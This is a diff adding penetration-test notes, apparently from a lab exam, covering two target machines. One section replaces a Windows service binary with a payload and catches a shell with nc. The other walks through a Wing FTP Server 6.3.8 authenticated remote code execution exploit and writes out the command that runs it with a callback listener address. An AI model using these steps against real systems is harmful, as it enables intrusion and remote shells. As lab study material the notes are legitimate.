@@ -1,0 +1,38 @@
+119 Machine
+
+fms login admin admin after download zip crack zip pass with john nabucodonosor extrat zip you will see meta files you can see pass and username list you can try rdp will login alex.l , after seen dr fone all is acces it create payload and change with wsidservice.exe restart machine take shell from nc
+
+114 Machine
+
+5.2 Target #1 192.168.110.114 
+Initial Access WingFTP remote code execution 
+Vulnerability Description: - This POC explain how to exploit Wing FTP Server 6.3.8 to
+get Remote Code Execution which can be exploited to execute commands in the 
+Operating System through the os.execute() function native to lua. 
+Vulnerability Fix: - Make sure you update the WingFTP server version to the latest. 
+Severity: - Critical
+Attack Steps: 
+1. Scanned the host using nmap to discover the open ports.
+After scanning the host, I found an ftp service which had anonymous user login 
+enabled. Which I was able to successfully login
+After successfully logging in, I found an interesting file When opened I
+found the username and the hash of the user
+Crack admin hash
+Username: - Admin 
+Password: - Password@1 
+After retrieving the credentials, I opened the html webpage which was running on port
+5466, and used the credentials to login which I was able to successfully login.
+logging in I spotted a lua script execution page as below.
+After googling I identified a vulnerability of remote code execution on Wing FTP server.
+https://www.exploit-db.com/exploits/50720
+# Exploit Title: Wing FTP Server - Authenticated RCE
+I removed the parts where highlighted in red colour as it was giving me an execution
+error and I added the cookie ID manually by retrieving the ID on the intercepted traffic in
+burp suite as shown below. And also added so that when the exploit 
+is executed the base64 encoded text is printed out. And the yellow highlighted part in 
+the above script was edited so that it would match the pages in the host 
+/admin_login.html
+Add your cookie in exploit
+Command: 
+Python3 50720.py 192.168.110.114 5466 192.168.49.110 7777 Admin 
+Password@1
